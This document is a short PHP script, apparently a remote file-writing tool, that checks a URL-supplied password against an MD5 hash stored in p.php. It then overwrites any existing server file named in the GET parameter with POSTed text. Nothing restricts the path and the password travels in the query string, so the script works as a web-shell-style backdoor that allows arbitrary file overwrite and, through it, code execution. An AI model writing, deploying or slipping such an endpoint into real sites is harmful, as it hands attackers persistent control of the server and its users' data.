<?php /*12.07.16
file_save.php?s=pass~url POST:$_POST['txt']

*/
if(!file_exists('./p.php')){exit('[X] Not Exist Pass');}
if(!isset($_GET['s'])){exit('[X] Not Exist GET S');}
$s0=explode('*/',file_get_contents('./p.php'));
$s0=explode('/*',$s0[0]);$s=explode('~',$_GET['s']); 
if(md5($s[0])!=$s0[1]){exit('[X] Pass');}

if(!file_exists($s[1])){exit('[X] file_save: not exist ('.$s[1].')');}
if(is_dir($s[1])){exit('[X] file_save: is dir ('.$s[1].')');}

if(file_put_contents($s[1], $_POST['txt'])){
	echo '[V] ';
}else{
	echo '[X]';
}

echo ' file_save';
for($i=1;$i<count($s);$i++){
	echo '~'.$s[$i];
}

?>
